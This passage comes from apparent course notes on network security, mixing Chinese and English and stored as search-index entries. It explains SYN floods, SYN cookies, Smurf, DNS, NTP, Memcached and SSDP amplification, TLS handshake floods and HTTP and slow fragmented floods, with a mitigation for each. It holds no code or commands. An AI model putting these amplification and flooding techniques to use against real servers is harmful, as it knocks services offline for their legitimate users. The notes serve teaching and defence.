\u6570\u636e\u5305\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u7684 ACK \u6570\u636e\u5305\u3002\u4f46\u7531\u4e8e attacker \u4e0d\u4f1a\u53d1\u9001 ACK \u6570\u636e\u5305\uff0c\u56e0\u6b64\u76ee\u6807\u670d\u52a1\u5668\u4f1a\u4e00\u76f4\u7b49\u5f85\uff0c\u76f4\u5230\u8d85\u65f6\u3002</li> <li>\u670d\u52a1\u5668\u5fc5\u987b\u7ef4\u62a4\u6bcf\u4e2a\u672a\u5b8c\u6210\u7684\u8fde\u63a5\u8bf7\u6c42\u7684\u72b6\u6001\uff0c\u76f4\u5230\u8d85\u65f6<sup>1</sup>\u6216\u5173\u95ed\u3002\u5373\u670d\u52a1\u5668\u4f1a\u4e3a\u6bcf\u4e00\u4e2a SYN \u6570\u636e\u5305\u5206\u914d\u4e00\u4e9b\u8d44\u6e90\uff0c\u5e76\u5c06\u5176\u653e\u5165 SYN queue/ SYN backlog \u4e2d\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u7684 ACK \u6570\u636e\u5305\u3002\u4f46\u8fd9\u4e2a\u961f\u5217\u7684\u5bb9\u91cf\u662f\u6709\u9650\u7684 (commonly set as 128 by default on some Linux systems), \u4e00\u65e6\u961f\u5217\u6ee1\u4e86\uff0c\u670d\u52a1\u5668\u5c06\u4e0d\u518d\u63a5\u53d7\u65b0\u7684\u8fde\u63a5\u8bf7\u6c42\u3002<ul> <li>\u5047\u8bbe\u670d\u52a1\u5668\u7684 SYN backlog \u961f\u5217\u5bb9\u91cf\u4e3a 128\uff0c\u8d85\u65f6\u65f6\u95f4\u8bbe\u7f6e\u4e3a 3 mins\u3002\u653b\u51fb\u8005\u6bcf 3 \u5206\u949f\u53d1\u9001 128 \u4e2a SYN \u6570\u636e\u5305\uff0c\u670d\u52a1\u5668\u5c06\u4e00\u76f4\u7b49\u5f85\uff0c\u76f4\u5230\u8d85\u65f6\uff0c\u800c\u4e0d\u4f1a\u63a5\u53d7\u65b0\u7684\u5408\u6cd5\u8bf7\u6c42\u3002</li> </ul> </li> </ul> <p>Single machine:</p> <ul> <li>SYN packets with random source IP addresses</li> <li>Fill up backlog queue on server</li> <li>No further connections possible</li> </ul> <p>1) Attack principle:</p> <ul> <li>server commits resources (memory) before confirming identify of client (when client responds)</li> </ul> <p>2) TCP SYN Flood \u7684\u6539\u8fdb: IP Spoofing : Craft SYN packets from randomly forged IP address</p> <ul> <li>SYN packets with random source IP addresses</li> <li>Fill up backlog queue on server</li> <li>No further connections possible</li> </ul> <p>For such random IP addresses, after they receive SYN ACK packets from the server, they may simply discard them as these IP addresses have not sent SYN requests at all</p> <p>3) Solution:</p> <ol> <li>increase backlog queue size<ul> <li>but attacker can sends more SYN packets!</li> </ul> </li> <li>decrease timeout <ul> <li>but interrupt normal service requests!</li> </ul> </li> <li>SYN Cookies<ul> <li>Goal: avoid state storage on server until 3-way handshake completes</li> <li>Idea: <ul> <li>server sends necessary states to client along with SYN-ACK;</li> <li>client sends these states back to server along with ACK;</li> </ul> </li> <li>\u901a\u8fc7 SYN Cookies, server \u53ef\u4ee5\u5728\u672a\u9a8c\u8bc1\u6bcf\u4e2a\u8fde\u63a5\u8bf7\u6c42\u4e4b\u524d\u4e0d\u4e3a\u5176\u5206\u914d\u8d44\u6e90\uff0c\u4ece\u800c\u514d\u53d7 TCP SYN Flood \u653b\u51fb\u7684\u5f71\u54cd\uff08\u4f46\u6301\u7eed\u8ba1\u7b97\u9a8c\u8bc1 SYN \u4e5f\u5f88\u6d88\u8017\u8d44\u6e90\uff09</li> </ul> </li> </ol> <p>SYN Cookies</p> <ul> <li>\u5728 client \u53d1\u9001\u7ed9 server \u7684 SYN \u5305\u540e\uff0c\u76f8\u6bd4\u4e4b\u524d\u7684 TCP handshake, server \u4e0d\u518d\u4fdd\u5b58 client \u7684 SN<sub>C</sub> \u5305\uff0c\u800c\u662f\u5c06 client \u7684\u4fe1\u606f\u52a0\u5bc6\u540e\u53d1\u9001\u7ed9 client \u81ea\u5df1\u7684 SN<sub>S</sub> \u5305\uff0c\u5176\u4e2d SN<sub>S</sub> = (T || M || L) (Total 32 bits)<ul> <li>T: 5-bit timestamp time()\u00a0logically right-shifted\u00a06 positions; 64-second resolution</li> <li>M: 3-bit MSS (maximum segment size)</li> <li>L: 24-bit keyed hash, L = MAC<sub>key</sub> (SAddr, SPort, DAddr, DPort, SN<sub>C</sub>, T)</li> </ul> </li> <li>server \u6536\u5230 client \u53d1\u56de\u7684 ack \u5305\u540e\uff0c\u590d\u539f SN<sub>C</sub> \u548c SN<sub>S</sub>\uff0c\u4e4b\u540e\u6838\u9a8c SN<sub>S</sub> \u5373\u53ef\u5224\u65ad\u662f\u5426\u662f\u5408\u6cd5\u7684 client</li> </ul> <p></p> <p>4) TCP SYN Flood Backscatter: \u6307 server \u63a5\u6536\u5230 Spoofed IP \u7684 SYN \u540e\u53d1\u56de\u7684 SYN + ACK \u5305</p> <ul> <li>backscatter packets can be used for detecting DDoS attacks</li> <li>Detection Principle: Since syn flood uses forged source IP, then responses to those forged IPs get no further responses</li> </ul>"}, {"location": "Course/netsec/ddos/#asymmetric-ddos-attack", "title": "Asymmetric DDoS Attack", "text": "<p>A relatively small number or low levels of resources are required  by an attacker to cause a significantly great number or higher level of target resources to malfunction or fail.</p>"}, {"location": "Course/netsec/ddos/#some-typical-examples", "title": "Some Typical Examples", "text": "<p>1) Smurf Attack</p> Smurf Attack <ul> <li>\u53c8\u79f0 Smurf Dos \u653b\u51fb\uff0c\u662f\u4e00\u79cd\u65e9\u671f\u7684\u7f51\u7edc\u653b\u51fb\u65b9\u5f0f\uff0c\u5229\u7528\u4e86 ICMP \u534f\u8bae\u7684 \u201c\u5e7f\u64ad\u5730\u5740\u201d \u529f\u80fd</li> <li>\u653b\u51fb\u8005\u4f2a\u9020\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\uff0c\u5411\u7f51\u7edc\u4e2d\u7684\u5e7f\u64ad\u5730\u5740\u53d1\u9001 ICMP Echo \u8bf7\u6c42\uff0c\u7f51\u7edc\u4e2d\u7684\u6240\u6709\u4e3b\u673a\u90fd\u4f1a\u54cd\u5e94\u8fd9\u4e2a\u8bf7\u6c42\uff0c\u4ece\u800c\u4f7f\u5f97\u76ee\u6807\u4e3b\u673a\u88ab\u5927\u91cf\u7684 ICMP Echo \u54cd\u5e94\u5305\u6df9\u6ca1</li> <li>Smurf Attack \u901a\u5e38\u662f DDos \u7684\u4e00\u79cd\u5f62\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u7f51\u7edc\u8282\u70b9\u8fdb\u4e00\u6b65\u589e\u5f3a\u653b\u51fb\u5f3a\u5ea6\u548c\u6301\u7eed\u65f6\u95f4</li> </ul> <ul> <li>\u7279\u70b9\uff1a<ul> <li>Amplify the effect of ping flood</li> <li>Exploit IP broadcast address</li> <li>Forward the single ICMP Echo Request to any other hosts in the same network</li> <li>Each host responds with an ICMP Echo Reply</li> <li>1 request but many replies</li> </ul> </li> <li>\u89e3\u51b3\u65b9\u6cd5: <ul> <li>Disable IP broadcast addresses on router and firewall (\u5373\u7981\u7528\u5b50\u7f51\u7684 broadcast \u529f\u80fd)</li> <li>Reject external packets to broadcast addresses (\u5373\u62d2\u7edd\u5916\u6765\u7684\u5e7f\u64ad\u5730\u5740\u7684\u8bf7\u6c42)</li> </ul> </li> </ul> <p></p> How a Smurf Attack works: <ul> <li>First the Smurf malware builds a spoofed packet that has its source address set to the real\u00a0IP address\u00a0of the targeted victim.</li> <li>The packet is then sent to an IP broadcast address of a router or\u00a0firewall, which in turn sends requests to every host device address inside the broadcasting network, increasing the number of requests by the number of networked devices on the network.</li> <li>Each device inside the network receives the request from the broadcaster and then responds to the spoofed address of the target with an ICMP Echo Reply packet.</li> <li>The target victim then receives a deluge of ICMP Echo Reply packets, potentially becoming overwhelmed and resulting in denial-of-service to legitimate traffic.</li> </ul> <p>2) DNS Amplification Attack</p> DNS Amplification Attack <ul> <li>DNS Amplification Attack \u662f\u4e00\u79cd DDoS \u653b\u51fb\uff0c\u5b83\u5229\u7528\u4e86\u5f00\u653e\u7684 DNS \u9012\u5f52\u89e3\u6790\u5668\u6765\u653e\u5927\u653b\u51fb\u6d41\u91cf\uff0c\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u88ab\u5927\u91cf\u7684 DNS \u54cd\u5e94\u5305\u6df9\u6ca1</li> <li>\u653b\u51fb\u8005\u4f2a\u9020\u76ee\u6807\u4e3b\u673a\u7684 IP \u5730\u5740\uff0c\u5411\u5f00\u653e\u7684 DNS \u9012\u5f52\u89e3\u6790\u5668\u53d1\u9001\u5927\u91cf DNS \u67e5\u8be2\u8bf7\u6c42\uff0c\u9012\u5f52\u89e3\u6790\u5668\u4f1a\u8fd4\u56de\u5927\u91cf\u7684 DNS \u54cd\u5e94\u5305\u7ed9\u76ee\u6807\u4e3b\u673a\uff0c\u4ece\u800c\u4f7f\u5f97\u76ee\u6807\u4e3b\u673a\u88ab\u5927\u91cf\u7684 DNS \u54cd\u5e94\u5305\u6df9\u6ca1</li> <li>\u653b\u51fb\u8005\u5229\u7528 DNS \u67e5\u8be2\u7279\u6027\uff0c\u6784\u9020\u4e00\u4e2a\u8f83\u5c0f\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u4f46\u4f1a\u8fd4\u56de\u4e00\u4e2a\u8f83\u5927\u7684 DNS \u54cd\u5e94\u5305\uff0c\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5c06\u653b\u51fb\u6d41\u91cf\u653e\u5927\u6570\u500d</li> </ul> <ul> <li>\u7279\u70b9\uff1a<ul> <li>\u5229\u7528 open DNS resolvers (\u4e92\u8054\u7f51\u516c\u5f00\u3001\u4efb\u4f55\u7528\u6237\u5747\u53ef\u8bbf\u95ee\u7684 DNS resolver)</li> <li>\u5229\u7528 <code>ANY</code> \u7c7b\u578b\u7684 DNS \u67e5\u8be2\uff0c\u53ef\u4ee5\u83b7\u53d6\u7ed9\u5b9a\u540d\u5b57\u7684\u6240\u6709\u7c7b\u578b\u7684\u4fe1\u606f</li> <li>Attack with an ANY-type DNS query with spoofed source IP address of the targeted server</li> <li>Amplify the effect of DNS query</li> <li>1 request but many reponses</li> </ul> </li> </ul> <ul> <li>EDNS: Extension Mechanisms for DNS sends DNS data in larger UDP packets (e.g. 60 bytes query, 3000 bytes response)</li> <li>Extension mechanism for\u00a0DNS\u00a0(EDNS, or\u00a0EDNS(0)) gives us a mechanism to send\u00a0DNS\u00a0data in larger packets over UDP.\u00a0</li> </ul> <ul> <li>\u89e3\u51b3\uff1a<ul> <li>reduce the number of open resolvers</li> <li>source IP verification - stop spoofed packets leaving network (\u8fd9\u9700\u8981 ISP \u6765\u5b9e\u73b0)</li> </ul> </li> </ul> \u4e00\u4e2a DNS \u6269\u589e <p>A DNS amplification can be broken down into four steps:</p> <ol> <li>The attacker uses a compromised endpoint to send\u00a0UDP\u00a0packets with spoofed IP addresses to a DNS recursor. The spoofed address on the packets points to the real IP address of the victim.</li> <li>Each one of the UDP packets makes a request to a DNS resolver, often passing an argument such as \u201cANY\u201d in order to receive the largest response possible.</li> <li>After receiving the requests, the DNS resolver, which is trying to be helpful by responding, sends a large response to the spoofed IP address.</li> <li>The IP address of the target receives the response and the surrounding network infrastructure becomes overwhelmed with the deluge of traffic, resulting in a denial-of-service.</li> </ol> <p>3) NTP Amplification Attack</p> NTP Amplification Attack <ul> <li>\u548c DNS Amplification Attack \u7c7b\u4f3c\uff0cNTP Amplification Attack \u4e5f\u662f\u4e00\u79cd DDoS \u653b\u51fb\uff0c\u5b83\u5229\u7528\u4e86\u5f00\u653e\u7684 NTP \u670d\u52a1\u5668\u6765\u653e\u5927\u653b\u51fb\u6d41\u91cf\uff0c\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u88ab\u5927\u91cf\u7684 NTP \u54cd\u5e94\u5305\u6df9\u6ca1</li> <li>\u5229\u7528\u4e00\u4e9b NTP \u670d\u52a1\u5668\u4e0a\u542f\u7528\u7684 <code>monlist</code> \u547d\u4ee4\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6210\u500d\u653e\u5927\u653b\u51fb\u6d41\u91cf\uff0c\u8be5\u547d\u4ee4\u5728\u65e7\u8bbe\u5907\u4e0a\u9ed8\u8ba4\u542f\u7528\uff0c\u5e76\u4f7f\u7528\u5411 NTP \u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\u7684\u6700\u540e 600 \u4e2a\u6e90 IP \u5730\u5740\u8fdb\u884c\u54cd\u5e94\u3002\u6765\u81ea\u5185\u5b58\u4e2d\u6709 600 \u4e2a\u5730\u5740\u7684\u670d\u52a1\u5668\u7684 <code>monlist</code> \u8bf7\u6c42\u5c06\u6bd4\u521d\u59cb\u8bf7\u6c42\u5927 206 \u500d\u3002\u8fd9\u610f\u5473\u7740\u4e00\u4e2a\u62e5\u6709 1GB \u4e92\u8054\u7f51\u6d41\u91cf\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c 200+ GB \u7684\u653b\u51fb \u2014&gt; \u7531\u6b64\u5bfc\u81f4\u7684\u653b\u51fb\u6d41\u91cf\u5927\u5e45\u589e\u52a0\u3002</li> </ul> \u7f51\u7edc\u65f6\u95f4\u534f\u8bae <ul> <li>NTP (Network Time Protocol) \u662f\u4e00\u79cd\u7528\u4e8e\u540c\u6b65\u8ba1\u7b97\u673a\u65f6\u949f\u7684\u534f\u8bae\uff0c\u5b83\u53ef\u4ee5\u4f7f\u8ba1\u7b97\u673a\u7684\u65f6\u949f\u4e0e\u5168\u7403\u6807\u51c6\u65f6\u95f4\u540c\u6b65\uff0c\u4ee5\u786e\u4fdd\u8ba1\u7b97\u673a\u7684\u65f6\u949f\u51c6\u786e\u65e0\u8bef\u3002</li> <li>NTP \u7684 <code>monlist</code> \u547d\u4ee4\u53ef\u4ee5\u8fd4\u56de NTP \u670d\u52a1\u5668\u7684\u76d1\u63a7\u4fe1\u606f\uff0c\u8fd9\u4e2a\u4fe1\u606f\u5305\u542b\u4e86\u6700\u8fd1\u7684 600 \u4e2a\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\uff0c\u8fd9\u4e2a\u4fe1\u606f\u53ef\u4ee5\u88ab\u5229\u7528\u6765\u653e\u5927\u653b\u51fb\u6d41\u91cf</li> </ul> <ul> <li>\u7279\u70b9\uff1a<ul> <li>\u5229\u7528 NTP servers</li> <li>\u5229\u7528 <code>monlist</code> command</li> <li>spoofed source IP address of the targeted server</li> <li>Amplify the effect of NTP query</li> <li>1 query but a large reponses</li> </ul> </li> </ul> <p></p> <ul> <li>\u89e3\u51b3\uff1a<ul> <li>reduce the number of NTP servers that support monlist;</li> <li>source IP verification - stop spoofed packets leaving network (\u8fd9\u9700\u8981 ISP \u6765\u5b9e\u73b0)</li> </ul> </li> </ul> \u4e00\u4e2a NTP \u6269\u589e <p>A NTP amplification can be broken down into four steps:</p> <ol> <li>The attacker uses a botnet to send UDP packets with\u00a0spoofed IP\u00a0addresses to a NTP server which has its monlist command enabled. The spoofed IP address on each packet points to the real IP address of the victim.</li> <li>Each UDP packet makes a request to the NTP server using its monlist command, resulting in a large response.</li> <li>The server then responds to the spoofed address with the resulting data.</li> <li>The IP address of the target receives the response and the surrounding network infrastructure becomes overwhelmed with the deluge of traffic, resulting in a\u00a0denial-of-service.</li> </ol> <p>4) Memcached Attack</p> Memcached Attack <p>\u4e0e\u6240\u6709 DDoS \u653e\u5927\u653b\u51fb\u7c7b\u4f3c\uff0c\u5229\u7528\u4e86\u5f00\u653e\u7684 Memcached \u670d\u52a1\u5668\u6765\u653e\u5927\u653b\u51fb\u6d41\u91cf\uff0c\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u88ab\u5927\u91cf\u7684 Memcached \u54cd\u5e94\u5305\u6df9\u6ca1</p> <ul> <li>Memcached \u670d\u52a1\u5668\u662f\u4e00\u79cd\u7f13\u5b58\u6570\u636e\u7684\u5f00\u6e90\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7528\u4e8e\u63d0\u9ad8 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\u548c\u54cd\u5e94\u901f\u5ea6\u3002</li> <li> <p>Memcached \u670d\u52a1\u4f7f\u7528 UDP\uff0c\u56e0\u6b64\u53d1\u9001\u524d\u5e76\u4e0d\u9700\u8981\u63e1\u624b\uff08\u524d\u9762\u51e0\u4e2a\u4e5f\u4e00\u6837\uff09\u3002\u653b\u51fb\u8005\u9884\u5148\u52a0\u8f7d\u4e00\u4e9b\u4fe1\u606f\uff0c\u7136\u540e\u4f2a\u88c5\u6210 victim \u5411 server \u8bf7\u6c42\u3002</p> </li> <li> <p>\u7279\u70b9:</p> <ul> <li>\u5229\u7528 Memcached servers</li> <li>\u5229\u7528 memcached request (triggers a response with a large volume of data to target)</li> </ul> </li> </ul> <p></p> <ul> <li>Attack principle:<ul> <li>preload large data to Memcached server</li> <li>spoof request to preloaded data from target</li> </ul> </li> <li>\u89e3\u51b3\uff1a<ul> <li>disable UDP on Memcached server</li> <li>firewall Memcached server</li> <li>source IP verification</li> <li><code>flush_all</code> command to Memcached server</li> </ul> </li> </ul> \u4e00\u4e2a Memcached \u653b\u51fb <p>A Memcached amplification can be broken down into four steps:</p> <ol> <li>An attacker implants a large payload* of data on an exposed memcached server.</li> <li>Next the attacker spoofs an\u00a0HTTP GET\u00a0request with the\u00a0IP address\u00a0of the targeted victim.</li> <li>The vulnerable memcached server that receives the request, which is trying to be helpful by responding, sends a large response to the target.</li> <li>The targeted server or its surrounding infrastructure is unable to process the large amount of data sent from the memcached server, resulting in overload and denial-of-service to legitimate requests.</li> </ol> <p>5) SSDP Attack</p> <ul> <li>\u7279\u70b9:<ul> <li>\u5229\u7528 SSDP (Simple Service Discovery Protocol)</li> <li>\u5229\u7528 UPnP (Universal Plug and Play) \u7f51\u7edc\u534f\u8bae</li> </ul> </li> </ul> <p>SSDP \u653b\u51fb\u662f\u4e00\u79cd\u5229\u7528 UPnP \u534f\u8bae\u7684\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb\u7684\u65b9\u5f0f\u3002UPnP \u662f\u4e00\u79cd\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u5141\u8bb8\u8bbe\u5907\u81ea\u52a8\u53d1\u73b0\u5e76\u914d\u7f6e\u5176\u4ed6\u8bbe\u5907\uff0c\u4ece\u800c\u5b9e\u73b0\u8bbe\u5907\u7684\u81ea\u52a8\u5316\u4ea4\u4e92\u3002SSDP \u662f UPnP \u534f\u8bae\u4e2d\u7684\u4e00\u4e2a\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u5b83\u901a\u8fc7 UDP \u5e7f\u64ad\u7684\u65b9\u5f0f\uff0c\u5728\u7f51\u7edc\u4e0a\u53d1\u73b0\u548c\u8bc6\u522b\u5176\u4ed6\u8bbe\u5907</p> <ul> <li> <p>Attack principle:</p> <ol> <li>the attacker conducts a scan looking for plug-and-play devices that can be utilized as amplification factors</li> <li>as the attacker discovers networked devices, they create a list of all the devices that respond</li> <li>the attacker creates a\u00a0UDP\u00a0packet with the\u00a0spoofed IP address of the targeted victim</li> <li>the attacker then uses a\u00a0botnet\u00a0to send a spoofed discovery packet to each plug-and-play device with a request for as much data as possible by setting certain flags, specifically <code>ssdp:rootdevice</code> or <code>ssdp:all</code></li> <li>as a result, each device will send a reply to the targeted victim with an amount of data up to about 30 times larger than the attacker\u2019s request</li> <li>the target then receives a large volume of traffic from all the devices and becomes overwhelmed, potentially resulting in\u00a0denial-of-service\u00a0to legitimate traffic</li> </ol> </li> <li> <p>\u89e3\u51b3\uff1ablock incoming UDP traffic on port 1900 at the\u00a0firewall</p> </li> </ul>"}, {"location": "Course/netsec/ddos/#asymmetric-ddos-attack-computation-resource", "title": "Asymmetric DDoS Attack (Computation Resource)", "text": "<p>computation asymmetry</p> <p>server costs more computation resources than attacker for a service request</p> <p>1) SSL/TLS Handshake</p> SSL/TLS <ul> <li>SSL (Secure Sockets Layer) \u548c TLS (Transport Layer Security) \u662f\u4e00\u79cd\u7528\u4e8e\u4fdd\u62a4\u7f51\u7edc\u901a\u4fe1\u7684\u534f\u8bae\uff0c\u5b83\u4eec\u4f7f\u7528\u52a0\u5bc6\u6280\u672f\u6765\u786e\u4fdd\u6570\u636e\u5728\u7f51\u7edc\u4e0a\u7684\u5b89\u5168\u4f20\u8f93\u3002SSL \u662f TLS \u7684\u524d\u8eab\uff0cTLS \u662f SSL \u7684\u5347\u7ea7\u7248\u3002</li> <li>SSL/TLS \u534f\u8bae\u4e3b\u8981\u901a\u8fc7\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f (Public Key Cryptography) \u548c \u5bf9\u79f0\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f (Symmetric Key Cryptography) \u6765\u4fdd\u62a4\u6570\u636e\u7684\u673a\u5bc6\u6027\u548c\u5b8c\u6574\u6027\u3002</li> <li>SSL/TLS \u63e1\u624b\u671f\u95f4\uff0c\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u9700\u8981\u8fdb\u884c\u591a\u6b21\u901a\u4fe1\uff0c\u8fdb\u884c\u52a0\u5bc6\u89e3\u5bc6\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u4f1a\u6d88\u8017\u670d\u52a1\u5668\u7684\u5927\u91cf\u8ba1\u7b97\u8d44\u6e90\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u901a\u8fc7\u53d1\u9001\u5927\u91cf\u7684 SSL/TLS \u63e1\u624b\u8bf7\u6c42\u6765\u8017\u5c3d\u670d\u52a1\u5668\u7684\u8ba1\u7b97\u8d44\u6e90</li> </ul> SSL/TLS Handshake <p></p> <ul> <li>Attack principle:<ul> <li>Exploit SSL/TLS handshake requests to drain server resources</li> <li>RSA-enc speed \\(\\approx\\) 10 \\(\\times\\) RSA-dec speed</li> <li>Single machine can bring down 10 web servers</li> </ul> </li> </ul> <p>SSL Flood \u6216 SSL Renegotiation Attack \u4f1a\u5229\u7528\u670d\u52a1\u5668\u7aef\u534f\u5546\u5b89\u5168 TLS \u8fde\u63a5\u6240\u9700\u7684\u5904\u7406\u80fd\u529b\u3002\u5b83\u8981\u4e48\u5411\u670d\u52a1\u5668\u53d1\u9001\u5927\u91cf\u5783\u573e\u6570\u636e\uff0c\u8981\u4e48\u4e0d\u65ad\u8981\u6c42\u91cd\u65b0\u534f\u5546\u8fde\u63a5\uff0c\u4ece\u800c\u4f7f\u670d\u52a1\u5668\u8d44\u6e90\u8d85\u51fa\u6781\u9650\uff0c\u5bfc\u81f4\u670d\u52a1\u5668\u8131\u673a\u3002</p> <p> <ul> <li>\u89e3\u51b3\uff1a</li> <ul> <li>\u9650\u5236\u6765\u81ea\u540c\u4e00 IP \u5730\u5740\u7684\u8bf7\u6c42</li> <li>\u4f7f\u7528\u9632\u706b\u5899\u8fc7\u6ee4\u5668\u6765\u963b\u6b62\u6076\u610f\u6d41\u91cf</li> <li>\u4f7f\u7528 SSL \u52a0\u901f\u5668\u6765\u63d0\u9ad8\u670d\u52a1\u5668\u7684\u5904\u7406\u80fd\u529b</li> <li>\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u6765\u5206\u6563\u6d41\u91cf</li> <li>\u8fd8\u53ef\u5bf9\u7cfb\u7edf\u8fdb\u884c\u4f18\u5316\uff0c\u4ee5\u63d0\u9ad8\u5176\u5904\u7406\u80fd\u529b\uff0c\u5982\u589e\u52a0 CPU\u3001\u5185\u5b58\u7b49</li> </ul> </ul> <p></p> <p>2) HTTP Flood</p> <p>HTTP Flood</p> <ul> <li>HTTP Flood \u662f\u4e00\u79cd DDoS \u653b\u51fb\uff0c\u5b83\u5229\u7528\u4e86 HTTP \u534f\u8bae\u7684\u6f0f\u6d1e\uff0c\u5982 HTTP \u8bf7\u6c42\u4e2d\u7684\u865a\u5047\u4fe1\u606f\u3001HTTP \u8bf7\u6c42\u4e2d\u7684\u5408\u6cd5\u4fe1\u606f\u8d85\u8fc7\u670d\u52a1\u5668\u7684\u5904\u7406\u80fd\u529b\u7b49</li> <li>\u653b\u51fb\u8005\u901a\u8fc7\u5927\u91cf\u7684 HTTP \u8bf7\u6c42\u5411\u76ee\u6807\u670d\u52a1\u5668\u53d1\u9001\u5927\u91cf\u65e0\u6548\u8bf7\u6c42\uff0c\u4ece\u800c\u8017\u5c3d\u670d\u52a1\u5668\u7684\u8d44\u6e90\uff0c\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u65e0\u6cd5\u5904\u7406\u5408\u6cd5\u7684\u8bf7\u6c42</li> </ul> <p>No IP Spoofing</p> <ul> <li>\u4e0d\u4f7f\u7528 IP Spoofing</li> <li>\u56e0 HTTP Flood \u9700\u8981 TLS\uff0cTLS \u9700\u8981\u4fdd\u8bc1\u8fd4\u56de\u7684 source IP \u662f\u81ea\u5df1\u7684 IP</li> </ul> <ul> <li>Command attackers to:<ul> <li>Complete the real TCP connection</li> <li>Complete the real TLS handshake</li> <li>Get/POST large image or other content</li> </ul> </li> </ul> <p>HTTP attack</p> HTTP GET attackHTTP POST attack <ul> <li>multiple computers or other devices are coordinated to send multiple requests for images, files, or some other asset from a targeted server. </li> <li>When the target is inundated with incoming requests and responses, denial-of-service will occur to additional requests from legitimate traffic sources.</li> </ul> <ul> <li>typically when a form is submitted on a website, the server must handle the incoming request and push the data into a persistence layer, most often a database. </li> <li>The process of handling the form data and running the necessary database commands is relatively intensive compared to the amount of processing power and bandwidth required to send the POST request.</li> <li>\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u4e86\u76f8\u5bf9\u8d44\u6e90\u6d88\u8017\u7684\u5dee\u5f02\uff0c\u76f4\u63a5\u5411\u76ee\u6807\u670d\u52a1\u5668\u53d1\u9001\u5927\u91cf POST \u8bf7\u6c42\uff0c\u76f4\u5230\u670d\u52a1\u5668\u5bb9\u91cf\u9971\u548c\u5e76\u51fa\u73b0\u62d2\u7edd\u670d\u52a1\u3002</li> </ul> <ul> <li>\u89e3\u51b3\uff1a<ul> <li>block or rate limit attacking source</li> <li>Rate control against large volume of traffic that occupies a long connection</li> </ul> </li> </ul> <p>3) Fragmented HTTP Flood</p> <p>Fragmented HTTP Flood</p> <ul> <li>\u5728\u8fd9\u4e2a\u653b\u51fb\u793a\u4f8b\u4e2d\uff0c\u5177\u6709\u6709\u6548 IP \u7684 BOT \u88ab\u7528\u6765\u4e0e\u7f51\u7edc\u670d\u52a1\u5668\u5efa\u7acb\u6709\u6548\u7684 HTTP \u8fde\u63a5\u3002\u7136\u540e\uff0cHTTP \u6570\u636e\u5305\u88ab\u673a\u5668\u4eba\u5206\u5272\u6210\u5c0f\u7247\u6bb5\uff0c\u5e76\u5728\u8d85\u65f6\u524d\u5c3d\u53ef\u80fd\u6162\u5730\u53d1\u9001\u5230\u76ee\u6807\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u957f\u65f6\u95f4\u4fdd\u6301\u8fde\u63a5\u6d3b\u52a8\uff0c\u800c\u4e0d\u4f1a\u5411\u4efb\u4f55\u9632\u5fa1\u673a\u5236\u53d1\u51fa\u8b66\u62a5\u3002</li> <li>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a BOT \u542f\u52a8\u591a\u4e2a\u672a\u88ab\u53d1\u73b0\u7684\u3001\u957f\u65f6\u95f4\u7684\u548c\u6d88\u8017\u8d44\u6e90\u7684\u4f1a\u8bdd\u3002Apache \u7b49\u5e38\u7528\u7f51\u7edc\u670d\u52a1\u5668\u6ca1\u6709\u6709\u6548\u7684\u8d85\u65f6\u673a\u5236\u3002\u8fd9\u662f\u4e00\u4e2a DDoS \u5b89\u5168\u6f0f\u6d1e\uff0c\u53ea\u8981\u5229\u7528\u51e0\u4e2a BOT\uff0c\u5c31\u80fd\u963b\u6b62\u7f51\u7edc\u670d\u52a1\uff1b</li> </ul> <ul> <li>\u7279\u70b9\uff1a<ul> <li>Establish a valid HTTP connection</li> <li>Split HTTP packets into tiny fragments</li> <li>Send fragments to the target as slowly as it allows before it times out</li> </ul> </li> </ul> <p>keep a resource-consuming connection active for a long time</p> <ul> <li>\u89e3\u51b3\uff1a<ul> <li>\u9650\u5236\u6bcf\u4e2a\u8fde\u63a5\u7684\u6700\u5927\u6301\u7eed\u65f6\u95f4</li> <li>\u4f7f\u7528\u9632\u706b\u5899\u8fc7\u6ee4\u5668\u6765\u963b\u6b62\u6076\u610f\u6d41\u91cf</li> <li>\u4f7f\u7528\u8d1f\u8f7d\u5747\u8861\u5668\u6765\u5206\u6563\u6d41\u91cf</li> <li>\u5bf9\u7cfb\u7edf\u8fdb\u884c\u4f18\u5316\uff0c\u4ee5\u63d0\u9ad8\u5176\u5904\u7406\u80fd\u529b\uff0c\u5982\u589e\u52a0 CPU\u3001\u5185\u5b58\u7b49</li> </ul> </li> </ul> <p>4) Payment DDoS</p> <p>Payment DDoS</p> <ul> 